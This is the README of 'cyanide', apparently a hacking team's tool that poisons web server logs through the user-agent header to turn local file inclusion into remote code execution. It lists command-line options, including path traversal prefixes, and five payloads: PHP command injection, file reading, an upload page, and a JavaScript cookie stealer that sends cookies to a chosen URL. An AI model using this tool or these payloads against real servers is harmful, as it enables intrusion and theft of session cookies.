# cyanide

Cyanide is a tool to poison request logs by injecting a payload in the user-agent. It currently has 5 standalone payloads.

This is a BadByte, my hacking team, Official Tool. You can join our hacking community [here](https://discord.gg/CDACNFg).

## Installation
For now, the only way of downloading this project is by cloning this repo. PyPi support will be added in the next update, hopefully!

## Usage

```
usage: cyanide.py [-h] [-q] [-Pl] [-pl [PAYLOAD [PAYLOAD ...]]] [-m METHOD] [-P PARAMETER] [-e] [-E] [-p PREFIX] [-s SUFFIX] [-u URL]

Log poisoner. Turns a Local File Inclusion to a Remote Code Execution. Counts 5 different payloads for now.

optional arguments:
  -h, --help            show this help message and exit
  -q, --quiet, --no-banner
                        Quiet mode. No banner.
  -Pl, --payloads, --list
                        List all possible payloads.
  -pl [PAYLOAD [DATA ...]], --payload [PAYLOAD [DATA ...]], --set-payload [PAYLOAD [DATA ...]]
                        Set payload (by index or ID). Use -Pl to list available payloads.
  -m METHOD, --method METHOD
                        HTTP request method. Ex.: POST
  -P PARAMETER, --par PARAMETER, --parameter PARAMETER
                        Query parameter name. Ex.: '-P view' => '?view='
  -e, --encode, --dds-encode
                        URL encode ../
  -E, --double-encode, --dds-double-encode
                        Double-encode ../
  -p PREFIX, --prefix PREFIX
                        Query prefix. Ex.: '../../../../../etc/cat/'
  -s SUFFIX, --suffix SUFFIX
                        Query suffix. Ex.: '&other='
  -u URL, --URL URL, --url URL
                        URL to attack.
```

Payloads:
```
[?] PHPCMD (min. 72 chars, necessitates 0 args) -> PHP Simple Command Injection: [PHP] Simple command injection with query variable 'c'. Usage: Ex.: ?c=ls
[?] PHPB64CMD (min. 102 chars, necessitates 0 args) -> PHP Simple Base64 Command Injection: [PHP] Simple command injection with query variable 'b', but the command is base64 and URL encoded. 
Usage: Ex.: ?b=bHM%3D
[?] PHPREADFILE (min. 130 chars, necessitates 0 args) -> PHP File Reader: [PHP] Read a file's contents. Using parameter 'f' to specificy a filename. Usage: Ex.: ?f=filename.ext
[?] PHPUPLOAD (min. 328 chars, necessitates 0 args) -> PHP Simple File Upload: [PHP] Simple file upload page to pop in the logs. Usage: You should find a typical file upload section in the logs.
[?] JSCOOKIEXSS (min. 104 chars, necessitates 1 args) -> JavaScript Simple XSS Cookie Stealer: [JS] Simple XSS Cookie Stealer. Needs one argument being the link to send a request with the cookies to. Usage: Specify the URL after choosing the payload. Ex.: -pl JSCOOKIEXSS http://myurl.com/
```
